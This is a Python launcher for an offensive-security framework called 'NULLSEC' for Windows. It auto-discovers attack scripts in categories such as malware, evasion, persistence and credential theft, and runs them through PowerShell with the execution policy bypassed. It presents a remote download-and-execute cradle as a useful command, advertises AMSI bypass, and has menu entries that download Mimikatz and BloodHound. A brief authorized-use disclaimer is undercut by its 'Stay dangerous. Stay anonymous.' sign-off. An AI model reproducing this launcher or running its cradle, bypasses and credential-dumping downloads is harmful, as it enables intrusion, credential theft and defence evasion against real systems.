#!/usr/bin/env python3
"""
NULLSEC FRAMEWORK v2.0 - WINDOWS EDITION
═══════════════════════════════════════════════════════════════════════════════
Advanced Offensive Security Operations Framework for Windows

Features:
- 185+ Attack modules with auto-discovery
- PowerShell script support (.ps1)
- Windows-native path handling
- Metasploit Framework integration  
- AI-powered attack automation
- Interactive console interface

Author: bad-antics development
GitHub: github.com/bad-antics
License: For authorized security testing only
"""

import os
import sys
import time
import random
import subprocess
import shutil
from pathlib import Path
import platform

# Detect Windows
IS_WINDOWS = platform.system() == 'Windows'

# Terminal colors (Windows compatible via colorama or ANSI escape codes)
class Colors:
    if IS_WINDOWS:
        try:
            import colorama
            colorama.init()
        except ImportError:
            pass
    
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# Get script directory (Windows compatible)
SCRIPT_DIR = Path(__file__).parent.absolute()
ATTACK_DIR = SCRIPT_DIR / "nullsecurity-windows"
POWERSHELL_DIR = SCRIPT_DIR / "powershell-modules"
COMMAND_HISTORY = []

def auto_discover_modules():
    """Automatically discover all attack modules"""
    discovered = []
    module_id = 1
    
    # Category detection from filename patterns
    category_patterns = {
        'Network': ['port-', 'network-', 'dns-', 'mitm-', 'arp-', 'wifi-', 'bluetooth-', 'sniffer', 'scan'],
        'Web': ['web-', 'xss-', 'sqli-', 'sql-', 'lfi-', 'rfi-', 'ssrf-', 'csrf-', 'jwt-', 'oauth-', 'ssti-', 'xxe-', 'cors-', 'csp-'],
        'Credentials': ['pass', 'hash', 'cred', 'brute', 'kerberos', 'ntlm', 'token-', 'mimikatz'],
        'Malware': ['payload', 'trojan', 'ransomware', 'rootkit', 'backdoor', 'rat-', 'c2-', 'cryptominer'],
        'Cloud': ['cloud-', 'aws-', 'azure-', 'gcp-', 's3-', 'kubernetes-', 'docker-', 'container-'],
        'Active Directory': ['ad-', 'ldap-', 'kerberoast', 'golden-ticket', 'dcsync', 'bloodhound'],
        'Database': ['database-', 'mysql-', 'postgres-', 'mssql-', 'oracle-', 'mongodb-', 'redis-'],
        'Mobile': ['mobile-', 'android-', 'ios-', 'apk-'],
        'Exploitation': ['exploit', 'kernel-', 'rop-', 'shellcode-', 'heap-', 'buffer-', 'overflow'],
        'Evasion': ['bypass', 'amsi-', 'edr-', 'av-', 'sandbox-', 'anti-', 'defender-'],
        'Persistence': ['persistence', 'backdoor', 'startup', 'registry-', 'scheduled-'],
        'Recon': ['recon', 'enum', 'shodan', 'osint', 'whois', 'dir-brute'],
        'Windows': ['uac-', 'windows-', 'powershell-', 'wmi-', 'psexec-', 'smb-'],
    }
    
    # Icon mapping
    category_icons = {
        'Network': '🌐', 'Web': '🕸️', 'Credentials': '🔑', 'Malware': '🦠',
        'Cloud': '☁️', 'Active Directory': '🏢', 'Database': '🗄️', 'Mobile': '📱',
        'Exploitation': '💣', 'Evasion': '🥷', 'Persistence': '🔒',
        'Recon': '🔍', 'Windows': '🪟',
    }
    
    # Discover PowerShell modules
    if POWERSHELL_DIR.exists():
        for script in sorted(POWERSHELL_DIR.glob('*.ps1')):
            category = 'Windows'
            for cat, patterns in category_patterns.items():
                if any(pattern in script.name.lower() for pattern in patterns):
                    category = cat
                    break
            
            icon = category_icons.get(category, '⚡')
            name = script.stem.replace('-', ' ').replace('_', ' ').title()
            
            discovered.append({
                'id': module_id,
                'name': name,
                'icon': icon,
                'script': str(script),
                'type': 'powershell',
                'desc': f'{category} attack module',
                'category': category
            })
            module_id += 1
    
    # Discover batch/cmd scripts
    if ATTACK_DIR.exists():
        for script in sorted(ATTACK_DIR.glob('*.bat')) + sorted(ATTACK_DIR.glob('*.cmd')):
            category = 'Windows'
            for cat, patterns in category_patterns.items():
                if any(pattern in script.name.lower() for pattern in patterns):
                    category = cat
                    break
            
            icon = category_icons.get(category, '⚡')
            name = script.stem.replace('-', ' ').replace('_', ' ').title()
            
            discovered.append({
                'id': module_id,
                'name': name,
                'icon': icon,
                'script': str(script),
                'type': 'batch',
                'desc': f'{category} attack module',
                'category': category
            })
            module_id += 1
    
    # Add built-in Windows tools
    builtin_tools = [
        {'name': 'PowerShell Empire', 'icon': '👑', 'category': 'Exploitation', 'cmd': 'powershell -ep bypass'},
        {'name': 'Mimikatz Integration', 'icon': '🔑', 'category': 'Credentials', 'cmd': 'mimikatz'},
        {'name': 'BloodHound Collector', 'icon': '🩸', 'category': 'Active Directory', 'cmd': 'sharphound'},
        {'name': 'CrackMapExec', 'icon': '💥', 'category': 'Credentials', 'cmd': 'crackmapexec'},
        {'name': 'Responder', 'icon': '📡', 'category': 'Network', 'cmd': 'responder'},
        {'name': 'Impacket Suite', 'icon': '📦', 'category': 'Network', 'cmd': 'impacket'},
        {'name': 'Rubeus', 'icon': '🔓', 'category': 'Active Directory', 'cmd': 'rubeus'},
        {'name': 'Certify', 'icon': '📜', 'category': 'Active Directory', 'cmd': 'certify'},
        {'name': 'Seatbelt', 'icon': '🪑', 'category': 'Recon', 'cmd': 'seatbelt'},
        {'name': 'SharpHound', 'icon': '🐕', 'category': 'Active Directory', 'cmd': 'sharphound'},
    ]
    
    for tool in builtin_tools:
        discovered.append({
            'id': module_id,
            'name': tool['name'],
            'icon': tool['icon'],
            'script': tool['cmd'],
            'type': 'builtin',
            'desc': f"{tool['category']} tool",
            'category': tool['category']
        })
        module_id += 1
    
    return discovered

# Auto-discover modules on startup
MODULES = auto_discover_modules()

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if IS_WINDOWS else 'clear')

def print_banner():
    """Display NULLSEC framework banner"""
    banner = f"""{Colors.RED}
 ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  ☠  OFFENSIVE SECURITY OPERATIONS FRAMEWORK v2.0  ☠
  Windows Edition - PowerShell & Windows Tools
  ═══════════════════════════════════════════════════════════════════
  
  {Colors.YELLOW}System:{Colors.WHITE} nullsec-Windows v2.0{Colors.CYAN}
  {Colors.GREEN}🔥 {len(MODULES)} Attack Modules {Colors.DIM}| {Colors.RED}⚡ PowerShell {Colors.DIM}| {Colors.BLUE}🌐 Windows Native{Colors.CYAN}
  
  {Colors.DIM}Developed by {Colors.MAGENTA}bad-antics{Colors.DIM} | github.com/bad-antics{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════{Colors.RESET}
"""
    print(banner)
    # Loading animation
    sys.stdout.write(f"{Colors.CYAN}  [")
    for i in range(50):
        time.sleep(0.01)
        sys.stdout.write("▓")
        sys.stdout.flush()
    sys.stdout.write(f"] {Colors.GREEN}SYSTEM READY{Colors.RESET}\n\n")
    sys.stdout.flush()

def print_menu(page=0, page_size=15):
    """Display module menu with pagination"""
    start = page * page_size
    end = min(start + page_size, len(MODULES))
    total_pages = max(1, (len(MODULES) + page_size - 1) // page_size)
    
    print(f"\n{Colors.CYAN}  ═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.CYAN}    #    MODULE                       TYPE           CATEGORY{Colors.RESET}")
    print(f"{Colors.CYAN}  ═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    
    for mod in MODULES[start:end]:
        num = f"{mod['id']:2d}"
        name = f"{mod['icon']} {mod['name']}"[:30].ljust(30)
        mod_type = mod.get('type', 'unknown')[:14].ljust(14)
        cat = mod['category'][:14]
        
        color = Colors.RED if mod['category'] in ['Exploitation', 'Malware'] else \
                Colors.YELLOW if mod['category'] in ['Evasion', 'Persistence'] else \
                Colors.CYAN if mod['category'] in ['Network', 'Web'] else \
                Colors.MAGENTA if mod['category'] == 'Credentials' else \
                Colors.BLUE if mod['category'] == 'Windows' else Colors.WHITE
        
        print(f"    {Colors.RED}[{num}]{Colors.RESET} {color}{name}{Colors.RESET} {Colors.DIM}{mod_type}{Colors.RESET} {cat}")
    
    print(f"{Colors.CYAN}  ═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.DIM}                        Page {page + 1}/{total_pages} ({len(MODULES)} modules){Colors.RESET}")
    
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                           COMMAND CENTER
═══════════════════════════════════════════════════════════════════════
 {Colors.YELLOW}[N]{Colors.RESET} Next Page    {Colors.YELLOW}[P]{Colors.RESET} Prev Page    {Colors.YELLOW}[R]{Colors.RESET} Random       {Colors.YELLOW}[C]{Colors.RESET} Categories
 {Colors.YELLOW}[S]{Colors.RESET} Search       {Colors.YELLOW}[E]{Colors.RESET} PowerShell   {Colors.YELLOW}[I]{Colors.RESET} AI Console   {Colors.YELLOW}[T]{Colors.RESET} Tools
 {Colors.YELLOW}[X]{Colors.RESET} Credits      {Colors.YELLOW}[Q]{Colors.RESET} Quit         {Colors.YELLOW}[1-{len(MODULES)}]{Colors.RESET} Run Module
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")

def run_module(mod, external=False):
    """Execute an attack module"""
    script_path = mod['script']
    mod_type = mod.get('type', 'builtin')
    
    clear_screen()
    print(f"""
{Colors.RED}═══════════════════════════════════════════════════════════════════════
  LAUNCHING ATTACK MODULE
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

  {Colors.CYAN}Module:{Colors.RESET} {mod['icon']} {mod['name']}
  {Colors.CYAN}Category:{Colors.RESET} {mod['category']}
  {Colors.CYAN}Type:{Colors.RESET} {mod_type}
  {Colors.CYAN}Script:{Colors.RESET} {script_path}

{Colors.RED}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    print(f"{Colors.YELLOW}[*] Executing module...{Colors.RESET}\n")
    time.sleep(0.5)
    
    COMMAND_HISTORY.append(script_path)
    
    try:
        if mod_type == 'powershell':
            # Execute PowerShell script
            if Path(script_path).exists():
                subprocess.run([
                    'powershell', '-ExecutionPolicy', 'Bypass', 
                    '-NoProfile', '-File', script_path
                ])
            else:
                print(f"{Colors.RED}[!] Script not found: {script_path}{Colors.RESET}")
        
        elif mod_type == 'batch':
            # Execute batch script
            if Path(script_path).exists():
                subprocess.run(['cmd', '/c', script_path])
            else:
                print(f"{Colors.RED}[!] Script not found: {script_path}{Colors.RESET}")
        
        elif mod_type == 'builtin':
            # Execute built-in command
            print(f"{Colors.CYAN}[*] Built-in tool: {script_path}{Colors.RESET}")
            print(f"{Colors.DIM}[*] This tool requires manual installation{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Opening PowerShell for manual execution...{Colors.RESET}")
            subprocess.run(['powershell', '-NoExit', '-Command', f'Write-Host "Ready to run: {script_path}" -ForegroundColor Cyan'])
        
        else:
            print(f"{Colors.RED}[!] Unknown module type: {mod_type}{Colors.RESET}")
    
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    
    print(f"\n{Colors.GREEN}[✓] Module execution complete{Colors.RESET}")
    input(f"{Colors.YELLOW}[*] Press ENTER to continue...{Colors.RESET}")

def category_filter():
    """Filter modules by category"""
    categories = sorted(list(set(mod['category'] for mod in MODULES)))
    
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}  SELECT CATEGORY:{Colors.RESET}\n")
    
    for i, cat in enumerate(categories, 1):
        count = sum(1 for m in MODULES if m['category'] == cat)
        print(f"    {Colors.RED}[{i:2d}]{Colors.RESET} {cat} ({count} modules)")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back to main menu")
    
    choice = input(f"\n{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
    
    if choice == 'b':
        return
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(categories):
            selected_cat = categories[idx]
            filtered = [m for m in MODULES if m['category'] == selected_cat]
            
            clear_screen()
            print_banner()
            print(f"\n{Colors.CYAN}  {selected_cat.upper()} MODULES:{Colors.RESET}\n")
            
            for mod in filtered:
                print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']}")
            
            print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
            
            sub_choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
            
            if sub_choice != 'b':
                try:
                    mod_id = int(sub_choice)
                    mod = next((m for m in MODULES if m['id'] == mod_id), None)
                    if mod:
                        run_module(mod)
                except ValueError:
                    pass
    except ValueError:
        pass

def search_modules():
    """Search for modules by keyword"""
    clear_screen()
    print_banner()
    query = input(f"\n{Colors.WHITE}  Search modules: {Colors.RESET}").strip().lower()
    
    if not query:
        return
    
    results = [m for m in MODULES if query in m['name'].lower() or query in m['desc'].lower() or query in m['category'].lower()]
    
    if not results:
        print(f"\n{Colors.RED}  No modules found matching '{query}'{Colors.RESET}")
        time.sleep(1.5)
        return
    
    print(f"\n{Colors.GREEN}  Found {len(results)} modules:{Colors.RESET}\n")
    
    for mod in results:
        print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']} - {mod['desc']}")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
    
    choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
    
    if choice != 'b':
        try:
            mod_id = int(choice)
            mod = next((m for m in MODULES if m['id'] == mod_id), None)
            if mod:
                run_module(mod)
        except ValueError:
            pass

def run_random_module():
    """Execute a random module"""
    if MODULES:
        mod = random.choice(MODULES)
        print(f"\n{Colors.YELLOW}[*] Random target: {mod['icon']} {mod['name']}{Colors.RESET}")
        time.sleep(0.5)
        run_module(mod)

def powershell_console():
    """Launch PowerShell console with bypass"""
    clear_screen()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                      NULLSEC POWERSHELL CONSOLE
               Windows PowerShell with Execution Bypass
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.YELLOW}Features:{Colors.RESET}
  • Execution Policy Bypass
  • AMSI Bypass Ready
  • In-memory execution support
  • Module import capabilities

{Colors.YELLOW}Useful Commands:{Colors.RESET}
  {Colors.GREEN}IEX(New-Object Net.WebClient).DownloadString('url'){Colors.RESET}  - Remote execution
  {Colors.GREEN}Import-Module <module>{Colors.RESET}                              - Import module
  {Colors.GREEN}Get-ExecutionPolicy{Colors.RESET}                                 - Check policy

{Colors.DIM}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[*] Launching PowerShell with execution bypass...{Colors.RESET}\n")
    subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-NoExit'])

def launch_ai_console():
    """Launch NULLSEC AI assistant"""
    ai_script = SCRIPT_DIR / 'nullsec-ai-windows.py'
    if ai_script.exists():
        subprocess.run(['python', str(ai_script)])
    else:
        print(f"{Colors.YELLOW}[*] AI module not found, trying fallback...{Colors.RESET}")
        fallback = SCRIPT_DIR / 'nullsec-ai.py'
        if fallback.exists():
            subprocess.run(['python', str(fallback)])
        else:
            print(f"{Colors.RED}[!] AI module not found{Colors.RESET}")
            time.sleep(2)

def tools_menu():
    """Windows security tools menu"""
    clear_screen()
    print_banner()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                      WINDOWS SECURITY TOOLS
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

  {Colors.RED}[1]{Colors.RESET} PowerShell Empire Setup
  {Colors.RED}[2]{Colors.RESET} Mimikatz Download & Run
  {Colors.RED}[3]{Colors.RESET} BloodHound/SharpHound
  {Colors.RED}[4]{Colors.RESET} Rubeus (Kerberos)
  {Colors.RED}[5]{Colors.RESET} CrackMapExec
  {Colors.RED}[6]{Colors.RESET} Responder
  {Colors.RED}[7]{Colors.RESET} Impacket Suite
  {Colors.RED}[8]{Colors.RESET} Certify (AD CS)
  {Colors.RED}[9]{Colors.RESET} Seatbelt (Enumeration)

  {Colors.GREEN}[B]{Colors.RESET} Back to main menu

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
    
    if choice == 'b':
        return
    
    tool_cmds = {
        '1': "Start-Process powershell -ArgumentList '-ep bypass' -Verb RunAs",
        '2': "Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest' -OutFile 'mimikatz.zip'",
        '3': "Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/releases/latest' -OutFile 'BloodHound.zip'",
        '4': "Write-Host 'Download Rubeus from: https://github.com/GhostPack/Rubeus' -ForegroundColor Cyan",
        '5': "pip install crackmapexec",
        '6': "pip install responder",
        '7': "pip install impacket",
        '8': "Write-Host 'Download Certify from: https://github.com/GhostPack/Certify' -ForegroundColor Cyan",
        '9': "Write-Host 'Download Seatbelt from: https://github.com/GhostPack/Seatbelt' -ForegroundColor Cyan",
    }
    
    if choice in tool_cmds:
        print(f"\n{Colors.CYAN}[*] Executing: {tool_cmds[choice]}{Colors.RESET}\n")
        subprocess.run(['powershell', '-Command', tool_cmds[choice]])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def show_credits():
    """Display credits and information"""
    clear_screen()
    print(f"""
{Colors.RED}
 ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  ☠  OFFENSIVE SECURITY OPERATIONS FRAMEWORK v2.0  ☠
  Windows Edition
  ═══════════════════════════════════════════════════════════════════
  
  {Colors.WHITE}Developed by:{Colors.CYAN}
  {Colors.MAGENTA}bad-antics development{Colors.CYAN}
  {Colors.DIM}github.com/bad-antics{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  
  {Colors.GREEN}• {len(MODULES)} Attack Modules{Colors.CYAN}
  {Colors.GREEN}• PowerShell Integration{Colors.CYAN}
  {Colors.GREEN}• Windows Native Tools{Colors.CYAN}
  {Colors.GREEN}• AI-Powered Assistance{Colors.CYAN}
  {Colors.GREEN}• Active Directory Attacks{Colors.CYAN}
  
  ═══════════════════════════════════════════════════════════════════
  {Colors.YELLOW}⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
{Colors.RESET}
""")
    input(f"{Colors.WHITE}  Press ENTER to continue...{Colors.RESET}")

def main():
    """Main application loop"""
    page = 0
    page_size = 15
    total_pages = max(1, (len(MODULES) + page_size - 1) // page_size)
    
    while True:
        clear_screen()
        print_banner()
        print_menu(page, page_size)
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'q':
            clear_screen()
            print(f"""
{Colors.RED}
 ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  ☠  NULLSEC OPERATIONS TERMINATED  ☠
  ═══════════════════════════════════════════════════════════════════
  
  Stay dangerous. Stay anonymous.
  
  {Colors.MAGENTA}bad-antics development{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
{Colors.RESET}
""")
            sys.exit(0)
        
        elif choice == 'n':
            page = (page + 1) % total_pages
        elif choice == 'p':
            page = (page - 1) % total_pages
        elif choice == 'r':
            run_random_module()
        elif choice == 'c':
            category_filter()
        elif choice == 's':
            search_modules()
        elif choice == 'e':
            powershell_console()
        elif choice == 'i':
            launch_ai_console()
        elif choice == 't':
            tools_menu()
        elif choice == 'x':
            show_credits()
        else:
            try:
                mod_id = int(choice)
                mod = next((m for m in MODULES if m['id'] == mod_id), None)
                if mod:
                    run_module(mod)
                else:
                    print(f"{Colors.RED}[!] Invalid module number{Colors.RESET}")
                    time.sleep(1)
            except ValueError:
                print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
                time.sleep(1)

if __name__ == "__main__":
    # Enable Windows ANSI colors
    if IS_WINDOWS:
        os.system('')  # Enable ANSI escape codes on Windows 10+
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Interrupted{Colors.RESET}\n")
        sys.exit(0)
